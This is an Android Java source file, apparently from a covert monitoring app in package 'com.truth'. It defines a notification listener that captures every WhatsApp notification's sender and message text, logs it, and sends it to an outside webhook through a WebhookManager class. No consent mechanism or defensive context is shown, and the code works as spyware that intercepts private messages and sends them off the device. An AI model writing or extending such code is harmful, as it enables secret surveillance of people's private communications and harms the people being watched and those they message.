package com.truth;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.os.Bundle;
import android.util.Log;

public class NotificationListener extends NotificationListenerService {
    private static final String TAG = "NotificationListener";
    private static final String WHATSAPP_PKG = "com.whatsapp";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (!sbn.getPackageName().equals(WHATSAPP_PKG)) return;

        Notification notification = sbn.getNotification();
        Bundle extras = notification.extras;

        String title = extras.getString(Notification.EXTRA_TITLE, "Unknown");
        CharSequence textChar = extras.getCharSequence(Notification.EXTRA_TEXT);
        String text = (textChar != null) ? textChar.toString() : "";

        // Format: aplication: NOTIFICATION: WhatsApp: [Remitente]: [Mensaje]
        String msg = "WhatsApp: " + title + ": " + text;
        
        Log.d(TAG, "Captured WhatsApp Notification: " + msg);
        
        WebhookManager.sendMessage(
            WebhookManager.WEBHOOK_NOTIFICATIONS, 
            "NOTIFICATION", 
            msg
        );
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Not needed for now
    }
}
